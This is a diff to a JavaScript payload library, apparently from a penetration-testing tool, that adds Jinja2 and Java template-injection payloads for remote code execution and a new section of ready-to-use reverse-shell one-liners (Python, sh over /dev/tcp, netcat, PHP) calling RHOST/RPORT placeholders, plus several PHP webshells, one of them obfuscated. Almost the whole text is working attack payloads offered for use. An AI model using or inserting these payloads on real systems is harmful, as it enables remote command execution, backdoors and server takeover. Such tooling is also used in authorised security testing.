@@ -182,16 +182,43 @@ window.Payload.LFI = {
 
 window.Payload.SSTI = {
   Jinja2: {
-    tuple2Class: value => '{{().__class__.__base__.__subclasses__()}}',
-    string2Class: value => "{{''.__class__.mro()[1].__subclasses__()}}",
-    list2Class: value => '{{[].__class__.__base__.__subclasses__()}}',
-    method2Global: value => '{{foo.__init__.__globals__}}',
-    // Reference: https://twitter.com/realgam3/status/1184747565415358469
-    flaskRCE: value => "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
+    tuple2AllSubclasses: value => '{{().__class__.__base__.__subclasses__()}}',
+    tuple2RCE: value => "{%for(x)in().__class__.__base__.__subclasses__()%}{%if'war'in(x).__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}",
+    g2RCE: value => "{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    url_for2RCE: value => "{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    application2RCE: value => "{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}",
+    // config2RCE Reference: https://twitter.com/realgam3/status/1184747565415358469
+    config2RCE: value => "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
+    add_url_rule: value => "{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}"
     // TODO: add features to bypass filter keywords like __ '' "" []
   },
   Java: {
     thymeleafRCE: value => '__${T(java.lang.Runtime).getRuntime().exec("nc ip port -e sh")}__::.x',
     commonRCE: value => "${T(java.lang.Runtime).getRuntime().exec('ls')}"
+  }
+}
+
+// TODO: show prompt for RHOST and RPORT 
+window.Payload.Shell = {
+  Python: {
+    py3: value => `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
+    py: value => `python -c 'import os,pty,socket;s=socket.socket();s.connect(("RHOST",RPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`,
+  },
+  sh: {
+    with_i: value => "sh -i >& /dev/tcp/RHOST/RPORT 0>&1",
+    without_i: value => "0<&196;exec 196<>/dev/tcp/RHOST/RPORT;sh <&196 >&196 2>&196"
+  },
+  nc: {
+    with_e: value => 'nc -e /bin/sh RHOST RPORT',
+    with_c: value => "nc -c bash RHOST RPORT"
+  },
+  php: {
+    reverse_shell: value => `php -r '$sock=fsockopen("RHOST",RPORT);exec("sh <&3 >&3 2>&3");'`,
+    webshell_eval: value => "<?=eval($_GET[_]);",
+    webshell_exec: value => "<?=exec($_GET[_]);",
+    webshell_system: value => "<?=system($_GET[_]);",
+    webshell_backquote: value => "<?=`$_GET[_]`;",
+    webshell_all_function: value => "<?=($_GET[ÿ])($_GET[_]);",
+    webshell_no_alphabets_digits: value => "<?=(~%8C%86%8C%8B%9A%92)(${_.(~%B8%BA%AB)}[_]);"
   }
 }
